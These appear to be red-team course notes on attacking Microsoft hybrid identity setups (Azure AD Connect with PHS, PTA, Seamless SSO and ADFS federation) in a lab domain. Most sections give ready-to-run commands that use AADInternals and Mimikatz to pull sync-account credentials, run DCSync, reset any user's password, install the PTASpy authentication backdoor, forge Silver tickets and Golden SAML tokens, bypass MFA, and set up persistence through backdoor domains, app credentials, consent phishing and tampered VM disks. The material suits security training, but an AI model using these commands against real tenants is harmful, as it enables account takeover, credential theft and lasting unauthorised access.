# 14 - Hybrid Identity

- [14 - Hybrid Identity](#14---hybrid-identity)
  - [Hybrid Identity](#hybrid-identity)
  - [Hybrid Identity - Azure AD Connect](#hybrid-identity---azure-ad-connect)
  - [Hybrid Identity - PHS](#hybrid-identity---phs)
  - [Hybrid Identity - PHS - Abuse](#hybrid-identity---phs---abuse)
  - [Lateral Movement - PHS](#lateral-movement---phs)
  - [Lateral Movement - PHS - On-Prem Dominance](#lateral-movement---phs---on-prem-dominance)
  - [Lateral Movement - PHS - On-Prem to Cloud](#lateral-movement---phs---on-prem-to-cloud)
  - [Hybrid Identity - PTA](#hybrid-identity---pta)
  - [Hybrid Identity - PTA - Abuse](#hybrid-identity---pta---abuse)
  - [Lateral Movement- PTA - On-Prem to Cloud](#lateral-movement--pta---on-prem-to-cloud)
  - [Lateral Movement- PTA - Cloud to On-Prem](#lateral-movement--pta---cloud-to-on-prem)
  - [Hybrid Identity - Seamless SSO](#hybrid-identity---seamless-sso)
  - [Persistence - AZUREADASSOC - On-Prem to Cloud](#persistence---azureadassoc---on-prem-to-cloud)
  - [Hybrid Identity - Federation](#hybrid-identity---federation)
  - [Hybrid Identity - Federation - ADFS](#hybrid-identity---federation---adfs)
  - [Hybrid Identity - Federation - Abuse](#hybrid-identity---federation---abuse)
  - [Lateral Movement - Federation - On-Prem to Cloud](#lateral-movement---federation---on-prem-to-cloud)
  - [Persistence - Hybrid Identity - On-Prem to Cloud](#persistence---hybrid-identity---on-prem-to-cloud)
  - [Persistence - Hybrid Identity - PTA and PHS](#persistence---hybrid-identity---pta-and-phs)
  - [Persistence - Federation - Trusted Domain](#persistence---federation---trusted-domain)
  - [Persistence - Federation - Token Signing Certificate](#persistence---federation---token-signing-certificate)
  - [Persistence - Storage Account Access Keys](#persistence---storage-account-access-keys)
  - [Persistence - Applications and Service Principals](#persistence---applications-and-service-principals)
  - [Persistence - Illicit Consent Grant](#persistence---illicit-consent-grant)
  - [Persistence - Azure VMs and NSGs](#persistence---azure-vms-and-nsgs)
  - [Persistence - Custom Azure AD Roles](#persistence---custom-azure-ad-roles)
  - [Persistence - Deployment Modification](#persistence---deployment-modification)

---

## Hybrid Identity

Organizations have resources, devices and applications both onpremises and in the cloud.

Many enterprises use their on-prem AD identities to access Azure applications to avoid managing separate identities on both. 

- *"A single user identity for authentication and authorization to all resources, regardless of locationâ€¦is hybrid identity."*

<br/>

---

## Hybrid Identity - Azure AD Connect

An on-premises AD can be integrated with Azure AD using **Azure AD Connect** with the following methods. Every method supports Single Sign-on (SSO):

1. Password Hash Sync (PHS)
2. Pass-Through Authentication (PTA)
3. Federation

For each method, at least the user synchronization is done and an account `MSOL_<installationidentifier>` is created on the on-prem AD.

<br/>

---

## Hybrid Identity - PHS

It synchronizes users and a hash of their password hashes (not clear-text or original hashes) from on-prem AD to Azure AD.

The simplest and most popular method for getting a hybrid identity.

PHS is required for features like Identity Protection and AAD Domain Services.

Hash synchronization takes place **every two minutes** (Built-in security groups are not synced). When a user tries to access any Azure resource, the authentication takes place on Azure AD.

By default, password expiry and account expiry are not reflected in Azure AD. **That means a user whose on-prem password is expired (not changed) can continue to access Azure resources using the old password**.

<br/>

---

## Hybrid Identity - PHS - Abuse

When PHS is configured:

1. An account with name `MSOL_<installationID>` is automatically created in onprem AD. For example, `MSOL_782bef6aa0a9`. This account has replication (DCSync) permissions in the on-prem AD.
2. An account `Sync_<name of on-prem ADConnect Server>_installationID` is created in Azure AD. For example, `Sync_DEFENG-ADCNCT_782bef6aa0a9`. This account **can reset password of ANY user** (synced or cloud only) **in Azure AD**.

<br/>

Passwords for both the accounts are stored in **SQL server on the server where Azure AD Connect is installed** and it is possible to extract them in clear-text if you have admin privileges on the server.

<br/>

---

## Lateral Movement - PHS

You can enumerate the server where Azure AD connect is installed using the following on-prem enumeration (assuming that the server is domain joined - which is the Microsoft recommended method).

Using ActiveDirectory module:

```
Get-ADUser -Filter "samAccountName -like 'MSOL_*'" -Properties * | select SamAccountName,Description | fl
```

<br/>

Or from Azure AD module:

```
Get-AzureADUser -All $true | ? { $_.userPrincipalName -match "Sync_" }
```

<br/>

---

## Lateral Movement - PHS - On-Prem Dominance

Once the Azure AD connect server is compromised. Use the below commands from the AADInternals module to extract credentials.

```
Get-AADIntSyncCredentials
```

<br/>

Using the creds of `MSOL_*` account, we can run **DCSync** against the onprem AD:

```
runas /netonly /user:defeng.corp\MSOL_782bef6aa0a9 cmd; Invoke-Mimikatz -Command '"lsadump::dcsync /user:defeng\krbtgt /domain:defeng.corp /dc:defeng-dc.defeng.corp"'
```

<br/>

---

## Lateral Movement - PHS - On-Prem to Cloud

Using the creds of `Sync_*` account, we can reset password for any user (including Global Administrators and even the user who created the tenant). Using the creds, request an access token for AADGraph and save it to cache.

```
$passwd = ConvertTo-SecureString '<password>' -AsPlainText -Force; $creds = New-Object System.Management.Automation.PSCredential("Sync_DEFENG-ADCNCT_782bef6aa0a9@defcorpsecure.onmicrosoft.com", $passwd); Get-AADIntAccessTokenForAADGraph -Credentials $creds -SaveToCache
```

<br/>

Next, enumerate the Global Admins:

```
Get-AADIntGlobalAdmins
```

To reset the password of an on-prem user that is synced to Azure AD we need the ImmutableId (Unique Identifier derived from on-prem GUID) for the user:

```
Get-AADIntUser -UserPrincipalName onpremadmin@defcorpsecure.onmicrosoft.com | select ImmutableId
```

Finally, reset the user's password.

```
Set-AADIntUserPassword -SourceAnchor "E2gG19HA4EaDe0+3LkcS5g==" -Password "SuperSecretpass#12321" -Verbose
```

- You can now access any Azure AD resource (like Azure portal) using the new password. For on-prem resources, the old password can be used.

<br/>

To reset the password of cloud only user, we need their CloudAnchor that can be calculated from their cloud objectID:

```
Get-AADIntUsers | ?{$_.DirSyncEnabled -ne "True"} | select UserPrincipalName,ObjectID
```

- The CloudAnchor is of the format `USER_ObjectID`.

Finally, reset the user's password.

```
Set-AADIntUserPassword -CloudAnchor "User_10caa362-7d18-48c9-a45b-9c3a78f3a96b" -Password "SuperSecretpass#12321" -Verbose
```

- You can now access any Azure AD resource (like Azure portal) using the new password.

<br/>

---

## Hybrid Identity - PTA

No password hash synchronization of any form to the cloud takes place in PTA but Identity synchronization still takes place.

Useful in enforcing on-prem password policies as the authentication is validated on-prem. The communication with cloud is done by an authentication agent and not the on-prem DC.

Only outbound communication (Ports 80 and 443) from the authentication agent to Azure AD.

![picture 215](images/3480e4c9aeea70f2ecdc5e3811dc8c11a0588125443249a6aa6e61dd2986c3cd.png)  


<br/>

## Hybrid Identity - PTA - Abuse

The Authentication Agent communicates to Azure AD on behalf of onprem DC. If we can compromise the authentication agent, it is possible to verify authentications for ANY synced user even if the password is wrong!

That is, you just need valid `userPrincipalName` and use any password with that! Skeleton key attack for Azure AD!

On the other hand, if we can compromise a Global Administrator, we can install an authentication agent in our own infrastructure that will authorize all login attempts.

<br/>

## Lateral Movement- PTA - On-Prem to Cloud

Once we have admin access to an Azure AD Connect server running PTA agent, run the following command from AADInternals to insert a backdoor. (Needs to be run as Administrator and needs VC++)

```
Install-AADIntPTASpy
```

Once the backdoor is installed, we can authenticate as any user synced from onprem without knowing the correct password!

Also, it is possible to see the correct password of on-prem users authenticating on the cloud using the below command on the machine where the backdoor is installed:

```
Get-AADIntPTASpyLog -DecodePasswords
```

The DLL used for injection and passwords are stored, by default, in a hidden directory `C:\PTASpy`.

<br/>

## Lateral Movement- PTA - Cloud to On-Prem

We can register a new PTA agent after getting GA privileges by setting it on an attacker controlled machine. Once the agent is setup, we can repeat the previous steps to authenticate using any password and also, get the passwords in clear-text:

```
Install-AADIntPTASpy
```

<br/>

Once the backdoor is installed, we can authenticate as any user synced from onprem without knowing the correct password!

Also, it is possible to see the correct password of on-prem users authenticating on the cloud using the below command on the machine where the backdoor is installed:

```
Get-AADIntPTASpyLog -DecodePasswords
```

<br/>

---

## Hybrid Identity - Seamless SSO

Azure AD Seamless SSO automatically signs users in **when they are on onprem domain-joined machine**. There is no need to use passwords to log in to Azure AD and on-prem applications.

Supported by both PHS and PTA.

When Seamless SSO is enabled, a computer account AZUREADASSOC is created in the on-prem AD. This account's Kerberos decryption key is shared with Azure AD.

Azure AD exposes an endpoint (https://autologon.microsoftazuread-sso.com) that accepts Kerberos tickets. Domain-joined machine's browser forwards the tickets to this endpoint for SSO.

<br/>

---

## Persistence - AZUREADASSOC - On-Prem to Cloud

Password/key of the `AZUREADSSOACC` never changes. If we can compromise the NTLM hash of the `AZUREADSSOACC` machine account, we can create **Silver Tickets** for any synced on-prem user!

```
Invoke-Mimikatz -Command '"lsadump::dcsync /user:defeng\azureadssoacc$ /domain:defeng.corp /dc:defeng-dc.defeng.corp"'
```

We just need the `userPrincipalName` and `SID` of the user to create the Silvert ticket that can be used from any machine connected to the internet

```
Invoke-Mimikatz -Command '"kerberos::golden /user:onpremadmin1 /sid:S-1-5-21-938785110-3291390659-577725712 /id:1108 /domain:defeng.corp /rc4:<> /target:aadg.windows.net.nsatc.net /service:HTTP /ptt"'
```

Our lab environment (for both PHS and PTA) uses different UPN prefixes for on-prem and Azure domain so the SSO will not work ;)

<br/>

---

## Hybrid Identity - Federation

In case of federation, a trust is established between unrelated parties like on-prem Active Directory and Azure AD.

In Federation, all authentication occurs in the on-prem environment and the user experiences SSO across all the trusted environments. Users can access cloud applications by using their on-prem credentials.

<br/>

![picture 216](images/3d862f63483d4a9f664c4609d2894bf31ebac9fe165fc53df5ac481774d70d12.png)  

<br/>

In any federation setup there are three parties:

1. User or Client
2. identity Provider (IdP)
3. Service Provider (SP)


The identity provider authenticates the user and then the user can access a service on the service provider.

Security Assertion Markup Language (SAML) is used for exchanging all the authentication and authorization information between the providers.

<br/>

![picture 217](images/6c45123408adc3ebb581d5501d7d8d96a94c4b210b35cc95595dd920d0e1464a.png)  

<br/>

---

## Hybrid Identity - Federation - ADFS

AD FS is a claims-based identity model.
- *.. claims are simply statements (for example, name, identity, group), made about users, that are used primarily for authorizing access to claims-based applications located anywhere on the Internet.*

Claims for a user are written inside the SAML tokens and are then signed to provide confidentiality by the IdP.

A user is identified by `ImmutableID`. It is globally unique and stored in Azure AD. The ImmuatbleID is stored on-prem as ms-DS-ConsistencyGuid for the user and/or can be derived from the GUID of the user.

<br/>

## Hybrid Identity - Federation - Abuse

In ADFS, SAML Response is signed by a token-signing certificate.

If the **certificate** is compromised, it is possible to authenticate to the Azure AD as ANY user synced to Azure AD!

Just like our PTA abuse, password change for a user or MFA won't have any effect because we are forging the authentication response. 

The certificate can be extracted from the AD FS server with DA privileges and then can be used from any internet connected machine. This is what the infamous **Golden SAML attacks** is!

<br/>

## Lateral Movement - Federation - On-Prem to Cloud

From any on-prem machine as a normal domain user, get the ImmutableID of the target user:

```
[System.Convert]::ToBase64String((Get-ADUser -Identity onpremuser | select -ExpandProperty ObjectGUID).tobytearray())
```

On AD FS server (as administrator):

```
Get-AdfsProperties |select identifier
```

Check the IssuerURI from Azure AD too (Use MSOL module and need GA privs):

```
Get-MsolDomainFederationSettings -DomainName deffin.com | select IssuerURI
```

Note:
When setting up the AD FS using Azure AD Connect, there is a difference between IssueURI on ADFS server and Azure AD. Use the one from AzureAD.

<br/>

With DA privileges on-prem, we can extract the ADFS token signing certificate from the ADFS server using AADInternals:

```
Export-AADIntADFSSigningCertificate
```

Use the below command from AADInternals to access cloud apps as the user whose immutableID is specified:

```
Open-AADIntOffice365Portal -ImmutableID v1pOC7Pz8kaT6JWtThJKRQ== -Issuer http://deffin.com/adfs/services/trust -PfxFileName C:\users\adfsadmin\Documents\ADFSSigningCertificate.pfx -Verbose
```

<br/>


With DA privileges on-prem, it is possible to create ImmutableID of cloud only users!

1 - Create a realistic ImmutableID

```
[System.Convert]::ToBase64String((New-Guid).tobytearray())
```

2 - Using AADInternals, export the token signing certificate

```
Export-AADIntADFSSigningCertificate
```

3 - Use the below command from AADInternals to access cloud apps as the user whose immutableID is specified

```
Open-AADIntOffice365Portal -ImmutableID pwrtlmsicU+5tgCUgHx2tA== -Issuer http://deffin.com/adfs/services/trust -PfxFileName C:\users\adfsadmin\Desktop\ADFSSigningCertificate.pfx -Verbose
```

<br/>

---

## Persistence - Hybrid Identity - On-Prem to Cloud

Like any other system, Azure provides many interesting persistence opportunities. Look for persistence, wherever we can modify or create a resource or permission or have an access that is not time limited.

<br/>

It is recommended by Microsoft to join the Azure AD Connect server to the on-prem AD. This means that the persistence mechanisms for on-prem (like Golden Ticket, Silver Ticket, ACL Backdoors and others) that provide us either DA on the onprem or local admin on the Azure AD connect server will allow to get GA on Azure AD on demand!

- For PHS, we can extract the credentials
- For PTA, we can install the agent
- For Federation, we can extract the certificate from ADFS server using DA

<br/>

## Persistence - Hybrid Identity - PTA and PHS

If self service password reset is enabled (which allows users to reset their own Azure AD passwords) and the reset is propagated to on-prem AD using password write back it opens up interesting persistence scenario.

If we have already compromised on-prem AD, we can provide high permissions (`DCSync` using `AdminSDHolder`) to a synced user that we control and can then reset password for the user from Azure AD (where it will not be an administrator). This will give us DA privs on-prem that we can use to get GA on Azure AD.

Since Azure AD connect does not support resetting passwords of accounts with admincount we need to use attacks like FullControl/DCSync permissions using AdminSDHolder.

<br/>

## Persistence - Federation - Trusted Domain

If we have GA privileges on a tenant, we can add a new domain (must be verified), configure its authentication type to Federated and configure the domain to trust a specific certificate (any.sts in the below command) and issuer. Using AADInternals:

```
ConvertTo-AADIntBackdoor -DomainName cyberranges.io
```

<br/>

Get ImmutableID of the user that we want to impersonate. Using Msol module:

```
Get-MsolUser | select userPrincipalName,ImmutableID
```

<br/>

Access any cloud app as the user:

```
Open-AADIntOffice365Portal -ImmutableID qIMPTm2Q3kimHgg4KQyveA== -Issuer "http://any.sts/B231A11F" -UseBuiltInCertificate -ByPassMFA $true
```

<br/>

## Persistence - Federation - Token Signing Certificate

With DA privileges on on-prem AD, it is possible to create and import **new Token signing** and **Token Decrypt certificates** that have a very long validity. This will allow us to log-in as any user whose ImuutableID we know.

Run the below command as DA on the ADFS server(s) to create new certs (default password '`AADInternals`'), add them to ADFS, disable auto rollver and restart the service:

```
New-AADIntADFSSelfSignedCertificates
```

Update the certificate information with Azure AD:

```
Update-AADIntADFSFederationSettings -Domain cyberranges.io
```

<br/>

---

## Persistence - Storage Account Access Keys

We already know that keys provide root equivalent privileges on an storage account. There are two access keys and they are NOT rotated automatically (unless a key vault is managing the keys).

This, of course, provides neat persistent access to the storage account. We can also generate SAS URL (including offline minting) using the access keys.

<br/>

---

## Persistence - Applications and Service Principals

Azure AD Enterprise Applications (service principals) and App Registration (applications) can be used for persistence.

With privileges of Application Administrator, GA or a custom role with microsoft.directory/applications/credentials/update permissions, we can add credentials (secret or certificate) to an existing application.

By targeting an application with high permissions this is a very useful persistence mechanism. It also allows to bypass MFA!

<br/>

We can also add a new application that has high permissions and then use that for persistence.

If we have GA privileges, we can create an application with the Privileged authentication administrator role - that allows to reset password of Global Administrators.

<br/>

Sign in as a service principal using Az PowerShell (Use the application ID as the username, and the secret as password):

```
$passwd = ConvertTo-SecureString "J~Q~QMt_qe4uDzg53MDD_jrj_Q3P.changed" -AsPlainText -Force
$creds = New-Object System.Management.Automation.PSCredential("311bf843-cc8b-459c-be24-6ed908458623", $passwd)

Connect-AzAccount -ServicePrincipal -Credential $credentials -Tenant 2d50cb29-5f7b-48a4-87ce-fe75a941adb6
```

For certificate based authentication:

```
Connect-AzAccount -ServicePrincipal -Tenant <TenantId> -CertificateThumbprint <Thumbprint> -ApplicationId <ApplicationId>
```

We can use az cli too to sign in as a service principal

<br/>

---

## Persistence - Illicit Consent Grant

By default, any user can register an application in Azure AD. We can register an application (only for the target tenant) that needs high impact permissions with admin consent - like sending mail on a user's behalf, role management etc.

This will allow us to execute phishing attacks that would be very fruitful in case of success!

<br/>

---

## Persistence - Azure VMs and NSGs

1. **OS level persistence** on an Azure VM where we have remote access is very useful.

2. Azure VMs also support **managed identity** so persistence on any such VM will allow us access to additional Azure resources.

3. We can also **create snapshot of disk** attached to a running VM. This can be used to extract secrets stored on disk (like SAM hive for Windows).

4. It is also possible to **attach a modified/tampered disk to a turned-off VM**. For example, add a local administrator!

Couple this with modification of NSGs to allow access from IPs that we control!

<br/>

---

## Persistence - Custom Azure AD Roles

If we have GA in a tenant, we can modify a custom role and assign that to a user that we control. Take a look at the permissions of the built-in administrative roles, we can pick individual actions. It is always helpful to go for minimal privileges.

- https://docs.microsoft.com/en-us/azure/active-directory/roles/permissions-reference

For example, Actions allowed to Application Developer are good enough for a low-privilege persistence as they allow application registration even if - "Users can register applications" setting is set to No

<br/>

---

## Persistence - Deployment Modification

Recall the GitHub account that we compromised earlier. If we have persistent access to external resources like GitHub repos that are a part of deployment chain, it will be possible to persist in the target tenant.

Often, a GitHub account would not have same level of security and monitoring compared to an Azure AD account with similar privileges! This is just an example, deployment modification has a huge attack surface!

<br/>

---